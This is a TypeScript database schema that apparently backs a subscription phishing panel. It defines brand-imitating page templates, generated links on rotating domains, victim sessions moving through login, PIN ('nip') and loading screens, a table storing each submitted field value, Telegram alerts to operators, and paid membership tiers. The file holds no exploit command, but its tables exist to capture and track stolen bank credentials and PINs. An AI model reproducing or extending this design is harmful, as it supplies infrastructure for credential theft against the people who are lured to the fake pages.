import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, json, boolean, integer } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  email: text("email"),
  role: text("role").notNull().default("user"), // "admin" | "user"
  membershipType: text("membership_type"), // "7_days" | "15_days" | "30_days" | null
  membershipStartDate: timestamp("membership_start_date"),
  membershipEndDate: timestamp("membership_end_date"),
  telegramChatId: text("telegram_chat_id"), // ID de chat de Telegram del usuario
  telegramNotifications: boolean("telegram_notifications").default(false), // Si recibe notificaciones
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const templates = pgTable("templates", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  numericId: text("numeric_id").notNull().unique(),
  name: text("name").notNull(),
  displayName: text("display_name").notNull(),
  description: text("description"),
  isActive: boolean("is_active").default(true),
  brandColor: text("brand_color").notNull(),
  brandLetter: text("brand_letter").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const generatedLinks = pgTable("generated_links", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  domain: text("domain").notNull(),
  userId: text("user_id").notNull(),
  templateId: varchar("template_id").references(() => templates.id),
  url: text("url").notNull().unique(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const sessions = pgTable("sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  linkId: varchar("link_id").references(() => generatedLinks.id),
  status: text("status").notNull().default("active"), // active, form_filled, expired
  currentScreen: text("current_screen").default("login"), // login, nip, loading
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  startedAt: timestamp("started_at").defaultNow(),
  lastActivity: timestamp("last_activity").defaultNow(),
});

export const submissions = pgTable("submissions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  sessionId: varchar("session_id").references(() => sessions.id),
  fieldName: text("field_name").notNull(),
  fieldValue: text("field_value").notNull(),
  submittedAt: timestamp("submitted_at").defaultNow(),
});

export const availableDomains = pgTable("available_domains", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  domain: text("domain").notNull().unique(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const activities = pgTable("activities", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  type: text("type").notNull(), // session_created, data_submitted, link_generated, session_expired
  description: text("description").notNull(),
  sessionId: varchar("session_id").references(() => sessions.id),
  linkId: varchar("link_id").references(() => generatedLinks.id),
  templateId: varchar("template_id").references(() => templates.id),
  metadata: json("metadata"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const adminConfig = pgTable("admin_config", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  key: text("key").notNull().unique(), // 'permanent_user_id'
  value: text("value").notNull(), // the actual user ID value
  createdAt: timestamp("created_at").defaultNow(),
});

// Insert schemas
export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const insertUserRegisterSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  email: true,
}).extend({
  permanentUserId: z.string().optional(),
});

export const insertUserLoginSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
}).extend({
  permanentUserId: z.string().optional(),
});

export const updateMembershipSchema = z.object({
  userId: z.string(),
  membershipType: z.enum(["7_days", "15_days", "30_days"]).nullable(),
});

export const insertTemplateSchema = createInsertSchema(templates).omit({
  id: true,
  createdAt: true,
});

export const insertGeneratedLinkSchema = createInsertSchema(generatedLinks).omit({
  id: true,
  url: true,
  createdAt: true,
});

export const insertSessionSchema = createInsertSchema(sessions).omit({
  id: true,
  startedAt: true,
  lastActivity: true,
});

export const insertSubmissionSchema = createInsertSchema(submissions).omit({
  id: true,
  submittedAt: true,
});

export const insertAvailableDomainSchema = createInsertSchema(availableDomains).omit({
  id: true,
  createdAt: true,
});

export const insertActivitySchema = createInsertSchema(activities).omit({
  id: true,
  createdAt: true,
});

export const insertAdminConfigSchema = createInsertSchema(adminConfig).omit({
  id: true,
  createdAt: true,
});

// Types
export type User = typeof users.$inferSelect;
export type InsertUser = z.infer<typeof insertUserSchema>;
export type InsertUserRegister = z.infer<typeof insertUserRegisterSchema>;
export type InsertUserLogin = z.infer<typeof insertUserLoginSchema>;
export type UpdateMembership = z.infer<typeof updateMembershipSchema>;

// Helper type for user with membership status
export type UserWithMembership = User & {
  hasActiveMembership: boolean;
  membershipDaysLeft: number | null;
};

export type Template = typeof templates.$inferSelect;
export type InsertTemplate = z.infer<typeof insertTemplateSchema>;

export type GeneratedLink = typeof generatedLinks.$inferSelect;
export type InsertGeneratedLink = z.infer<typeof insertGeneratedLinkSchema>;

export type Session = typeof sessions.$inferSelect;
export type InsertSession = z.infer<typeof insertSessionSchema>;

export type Submission = typeof submissions.$inferSelect;
export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;

export type AvailableDomain = typeof availableDomains.$inferSelect;
export type InsertAvailableDomain = z.infer<typeof insertAvailableDomainSchema>;

export type Activity = typeof activities.$inferSelect;
export type InsertActivity = z.infer<typeof insertActivitySchema>;

export type AdminConfig = typeof adminConfig.$inferSelect;
export type InsertAdminConfig = z.infer<typeof insertAdminConfigSchema>;

// Extended types for API responses
export type SessionWithData = Session & {
  submissions: Submission[];
  link: GeneratedLink & { template: Template };
};

export type LinkWithStats = GeneratedLink & {
  template: Template;
  sessionCount: number;
  submissionCount: number;
};

export type DashboardStats = {
  activeSessions: number;
  totalLinks: number;
  totalSubmissions: number;
  successRate: number;
};

export type AdminDashboardStats = DashboardStats & {
  totalUsers: number;
  activeMembers: number;
  expiredMembers: number;
};
